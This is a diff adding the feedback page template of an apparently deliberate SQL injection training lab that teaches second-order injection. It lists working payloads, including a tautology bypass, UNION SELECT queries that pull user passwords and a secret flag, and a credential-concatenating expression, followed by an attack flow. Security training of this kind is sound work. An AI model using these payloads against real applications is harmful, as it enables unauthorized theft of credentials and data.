@@ -1,0 +1,81 @@
+{% extends "base.html" %}
+
+{% block title %}Feedback - SQL Injection Lab{% endblock %}
+
+{% block content %}
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">💬 Submit Feedback</span>
+        <span class="badge badge-danger">Vulnerable: Second-Order SQLi (Storage)</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">
+        This form is part of a <strong>Second-Order SQL Injection</strong> chain.
+        Your input is stored here, then later used unsafely in the admin panel.
+        The payload you enter now will execute when an admin views feedback in <code>/admin/feedback</code>.
+    </p>
+    {% if success %}
+        <div class="alert alert-success">{{ success }}</div>
+    {% endif %}
+    {% if error %}
+        <div class="alert alert-danger">{{ error }}</div>
+    {% endif %}
+    <form method="POST" action="{{ url_for('feedback') }}">
+        <div class="form-group">
+            <label>Your Name</label>
+            <input type="text" name="name" placeholder="John Doe" required>
+        </div>
+        <div class="form-group">
+            <label>Email</label>
+            <input type="email" name="email" placeholder="john@example.com">
+        </div>
+        <div class="form-group">
+            <label>Message</label>
+            <textarea name="message" placeholder="Your feedback..." required></textarea>
+        </div>
+        <button type="submit" class="btn btn-primary">Submit Feedback</button>
+    </form>
+</div>
+
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">💉 Second-Order SQLi Storage Payloads</span>
+        <span class="badge badge-warning">Enter these in the Name field</span>
+    </div>
+    <div class="payload">
+        <div class="payload-label">Name: Bypass filter to see all feedback (including unapproved)</div>
+        ' OR '1'='1' --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Name: Inject user credentials into feedback results</div>
+        ' UNION SELECT id, username, password, email, role FROM users --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Name: Extract the secret flag</div>
+        ' UNION SELECT id, secret_key, secret_value, description, 'flag' FROM secrets WHERE secret_key='FLAG' --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Message: Concatenate secret data into a normal message</div>
+        ' || (SELECT group_concat(username || ':' || password) FROM users) || '
+    </div>
+</div>
+
+<div class="card" style="border-color: var(--info);">
+    <div class="card-header">
+        <span class="card-title" style="color: var(--info);">🔗 Attack Flow</span>
+    </div>
+    <ol style="padding-left: 20px; color: var(--text-muted); font-size: 13px; line-height: 2;">
+        <li><strong>Step 1:</strong> Submit malicious payload via this <code>/feedback</code> form</li>
+        <li><strong>Step 2:</strong> Payload is stored in the <code>feedback</code> table (appears safe)</li>
+        <li><strong>Step 3:</strong> Admin visits <code>/admin/feedback</code> and filters by name</li>
+        <li><strong>Step 4:</strong> Stored payload executes in the admin's query — data breach!</li>
+    </ol>
+    <p style="margin-top: 12px; color: var(--warning); font-size: 13px;">
+        <strong>Why it's dangerous:</strong> Input validation at storage time is useless if the data 
+        is later used in a vulnerable query. Always sanitize at the point of use!
+    </p>
+</div>
+
+<div style="text-align: center; margin-top: 20px;">
+    <a href="{{ url_for('admin_feedback') }}" class="btn btn-danger">→ Go to Admin Feedback Panel</a>
+</div>
+{% endblock %}
